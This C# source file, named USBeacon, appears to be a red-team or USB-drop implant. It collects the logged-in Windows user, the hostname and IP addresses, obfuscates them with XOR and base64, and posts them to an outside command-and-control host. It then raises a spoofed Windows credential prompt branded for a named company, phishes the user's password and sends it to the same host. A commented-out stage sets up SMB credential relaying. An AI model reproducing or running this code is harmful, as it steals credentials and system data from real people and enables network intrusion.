using System;
using System.Text;
using System.Net;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;


namespace USBeacon
{
    class User
    {
        public String Identity;
        public User()
        {
            Identity = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        }
    }

    class Machine
    {

        public String MachineInfo;
        public Machine()
        {

            try
            {
                String delim = "^";
                String hostName = Dns.GetHostName();
                IPHostEntry hostInfo = Dns.GetHostEntry(hostName);

                StringBuilder sb = new StringBuilder();

                sb.Append(hostInfo.HostName).Append(delim);

                
                for (int index = 0; index < hostInfo.AddressList.Length; index++)
                {
                    // Get only iPv4s
                    if (hostInfo.AddressList[index].AddressFamily.ToString() == ProtocolFamily.InterNetwork.ToString() )
                        sb.Append(hostInfo.AddressList[index]).Append(delim);
                }
                MachineInfo = sb.ToString();
            }
            catch (Exception) {}
        }
    }


    class Program
    {
        private static String GetId()
        {
            return BitConverter.ToString(Encoding.Default.GetBytes(Dns.GetHostName())).Replace("-", "");
        }

        private static String EncodePay(String plainText)
        {

            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            return Convert.ToBase64String(plainTextBytes);

        }

        private static String EncryptPay(string plainText, string key)
        {
            var result = new StringBuilder();

            for (int c = 0; c < plainText.Length; c++)
            {
                result.Append(((uint) plainText[c] ^ (uint) key[c%key.Length]));
                if (c < (plainText.Length -1) )
                    result.Append((char) ',');
            }

            return result.ToString();
        }

        private static String OpenStage1()
        {
            String user = new User().Identity;
            String machine = new Machine().MachineInfo;
            String data = user + "^" + machine;
            return data;
        }
        private static String OpenStage2(String spoofDomain)
        {
            NetworkCredential nc = new NetworkCredential();
            AuthGrabber.GetCredentialsVistaAndUp(spoofDomain, out nc);
            String data = "";
            if (nc != null)
                data = "user:" + nc.UserName.ToString() + "," + "pass:" + nc.Password.ToString();
            return data;
        }

        static void Main(string[] args)
        {
            Boolean SafeDelivery = true;

            // Defaults
            String resource = "beacon";
            String key = null;
            String data = "";

            // Safer transparent delivery
            if (SafeDelivery)
            {
                resource = "ebeacon";
                key = "~";
            }

            String hashid = GetId();   // Unique but repeatable ID of beacon built off of hostname
            UriBuilder c2 = new UriBuilder();   
            c2.Scheme = "http";
            //c2.Host = "192.168.88.188";
            //c2.Port = 5000;

            c2.Host = "healthybitsatwork.com";
            c2.Port = 8000;
            c2.Path = resource + "/";
            c2.Path += hashid;
             
            String site = c2.ToString();

            //Stage 1: Collect beacon info
            data= OpenStage1();
            if (SafeDelivery)
                data = EncodePay(EncryptPay(data, key));


            using (WebClient client = new WebClient())
            {
                // Leverage SSO
                if (client.Proxy != null)
                    client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

                // HTTP POST
                client.UploadValues(site, new NameValueCollection()
                {
                    {"a", "hid"},
                    {"d", data}
                });
            }

            //Stage 2: Phish Creds.
            data = OpenStage2("Seattle Genetics");
            if (SafeDelivery)
                data = EncodePay(EncryptPay(data, key));

            using (WebClient client = new WebClient())
            {
                // Leverage SSO
                if (client.Proxy != null)
                    client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

                // HTTP POST
                client.UploadValues(site, new NameValueCollection()
                {
                    {"a", "phs"},
                    {"d", data}
                });
            }

            //Stage 3: Conenct to SMB relayer
            /*using (WebClient client = new WebClient())
            {
                // Leverage SSO
                if (client.Proxy != null)
                    client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                String somefile = "bogus.pdf";
                client.DownloadFile(somefile, @"\\healthybitsatwork.com\signin");
            }*/


        }
  
    }
}
